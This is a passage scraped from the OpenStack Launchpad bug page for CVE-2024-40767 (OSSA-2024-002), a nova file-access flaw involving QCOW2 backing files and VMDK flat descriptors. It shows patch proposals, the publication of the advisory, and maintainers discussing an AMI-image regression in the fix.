  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Incomplete file access fix and regression for QCOW2 backing files and<br />- VMDK flat descriptors (CVE-2024-40767)<br />+ [OSSA-2024-002] Incomplete file access fix and regression for QCOW2<br />+ backing files and VMDK flat descriptors (CVE-2024-40767)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-23 13:55:14 UTC" datetime="2024-07-23T13:55:14.242459+00:00">on 2024-07-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/84" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:01:15.624429+00:00" title="2024-07-23 14:01:15 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/84">
                <strong>Fix proposed to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/84"> #84</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924731">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924731</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: master
Review: https://review.opendev.org/c/openstack/nova/+/924731</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; In Progress
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/85" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:01:51.987047+00:00" title="2024-07-23 14:01:51 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/85">
                <strong>Fix proposed to nova (stable/2024.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/85"> #85</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/2024.1<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924732">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924732</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/2024.1
Review: https://review.opendev.org/c/openstack/nova/+/924732</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/86" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:02:37.462887+00:00" title="2024-07-23 14:02:37 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/86">
                <strong>Fix proposed to nova (stable/2023.2)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/86"> #86</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/2023.2<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924733">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924733</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/2023.2
Review: https://review.opendev.org/c/openstack/nova/+/924733</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/87" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:03:05.201343+00:00" title="2024-07-23 14:03:05 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/87">
                <strong>Fix proposed to nova (stable/2023.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/87"> #87</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/2023.1<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924734">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924734</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/2023.1
Review: https://review.opendev.org/c/openstack/nova/+/924734</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; In Progress
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/88" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:04:04.330574+00:00" title="2024-07-23 14:04:04 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/88">
                <strong>Fix proposed to ossa (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/88"> #88</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/ossa/+/924735">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/ossa/+<wbr />/924735</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: master
Review: https://review.opendev.org/c/openstack/ossa/+/924735</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-23 14:05:49 UTC" datetime="2024-07-23T14:05:49.474852+00:00">on 2024-07-23</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Jeremy Stanley (fungi)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/89" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:20:31.258103+00:00" title="2024-07-23 14:20:31 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/89"> #89</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>the reviews are now live and attached as seen above ^ but ill summarise here</p>
<p>Master: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924731">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924731</a><br />
stable/2024.1: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924732">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924732</a><br />
stable/2023.2: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924733">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924733</a><br />
stable/2023.1: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924734">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924734</a></p>
<p>i have updated the commit sha in the stable branches assuming the previous patch merges without changes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">the reviews are now live and attached as seen above ^ but ill summarise here

Master: https://review.opendev.org/c/openstack/nova/+/924731 
stable/2024.1: https://review.opendev.org/c/openstack/nova/+/924732 
stable/2023.2: https://review.opendev.org/c/openstack/nova/+/924733 
stable/2023.1: https://review.opendev.org/c/openstack/nova/+/924734 

i have updated the commit sha in the stable branches assuming the previous patch merges without changes.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/90" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T14:38:23.032259+00:00" title="2024-07-23 14:38:23 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/90">
                <strong>Fix merged to ossa (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/90"> #90</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/ossa/+/924735">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/ossa/+<wbr />/924735</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/ossa/commit/43ab26efbd928d03f6d8f93b7f6ff2afd765e4fc">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />ossa/commit/<wbr />43ab26efbd928d0<wbr />3f6d8f93b7f6ff2<wbr />afd765e4fc</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    master</p>
<p>commit 43ab26efbd928d0<wbr />3f6d8f93b7f6ff2<wbr />afd765e4fc<br />
Author: Jeremy Stanley &lt;email address hidden&gt;<br />
Date:   Tue Jul 23 13:25:26 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add OSSA-2024-002 (CVE-2024-40767)</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I0108e766ac2aa8<wbr />145860736a92115<wbr />b5a963d38aa<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/ossa/+/924735
Committed: https://opendev.org/openstack/ossa/commit/43ab26efbd928d03f6d8f93b7f6ff2afd765e4fc
Submitter: "Zuul (22348)"
Branch:    master

commit 43ab26efbd928d03f6d8f93b7f6ff2afd765e4fc
Author: Jeremy Stanley &lt;fungi@yuggoth.org&gt;
Date:   Tue Jul 23 13:25:26 2024 +0000

    Add OSSA-2024-002 (CVE-2024-40767)
    
    Change-Id: I0108e766ac2aa8145860736a92115b5a963d38aa
    Closes-Bug: #2071734
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/91" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T15:02:05.398874+00:00" title="2024-07-23 15:02:05 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/91"> #91</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The advisory text is now published to <a rel="nofollow" href="https://security.openstack.org/">https:/<wbr />/security.<wbr />openstack.<wbr />org/</a> and copies have been sent to the usual mailing lists. I&#x27;ve also notified MITRE that they can switch the CVE assignment to public.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The advisory text is now published to https://security.openstack.org/ and copies have been sent to the usual mailing lists. I've also notified MITRE that they can switch the CVE assignment to public.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/92" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T15:14:50.342615+00:00" title="2024-07-23 15:14:50 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/92">
                <strong>Related fix proposed to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/92"> #92</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924746">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924746</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: master
Review: https://review.opendev.org/c/openstack/nova/+/924746</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/93" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T19:36:07.053389+00:00" title="2024-07-23 19:36:07 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/93"> #93</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>the upstream ci found an issue with our handling of ami format images</p>
<p><a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/924775">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/924775</a> is the fix as a result i will be updating all the gerrit patches to include that fix.</p>
<p>i will comment here again when that is done.</p>
<p>its important that all distos ensure they pull the final merged version of the patch not the version attach to the bug report as patch files.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">the upstream ci found an issue with our handling of ami format images

https://review.opendev.org/c/openstack/nova/+/924775 is the fix as a result i will be updating all the gerrit patches to include that fix.

i will comment here again when that is done.

its important that all distos ensure they pull the final merged version of the patch not the version attach to the bug report as patch files.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/94" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-23T21:03:29.543627+00:00" title="2024-07-23 21:03:29 UTC">on 2024-07-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/94"> #94</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>To be clear, the original version of the patches on this bug and in the advisory _DO_ fix the CVE and are absolutely what should be packaged by distros ASAP to close the hole.</p>
<p>That said, the checks overzealously reject AMI images that qemu detects as raw if/when they are registered in glance as disk_format=ami (instead of raw). The final version we&#x27;re working on in gerrit will have a small change from these to avoid that mismatch, but it&#x27;s far more important to have the security fix. I&#x27;m not sure how many nova deployments actually use/support AMI, but none of the downstream testers noticed so I suspect very little. This continues to support the case for us to either deprecate support for AMI, or very strictly define the bounds around what we&#x27;ll allow in something called AMI.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">To be clear, the original version of the patches on this bug and in the advisory _DO_ fix the CVE and are absolutely what should be packaged by distros ASAP to close the hole.

That said, the checks overzealously reject AMI images that qemu detects as raw if/when they are registered in glance as disk_format=ami (instead of raw). The final version we're working on in gerrit will have a small change from these to avoid that mismatch, but it's far more important to have the security fix. I'm not sure how many nova deployments actually use/support AMI, but none of the downstream testers noticed so I suspect very little. This continues to support the case for us to either deprecate support for AMI, or very strictly define the bounds around what we'll allow in something called AMI.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/95" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
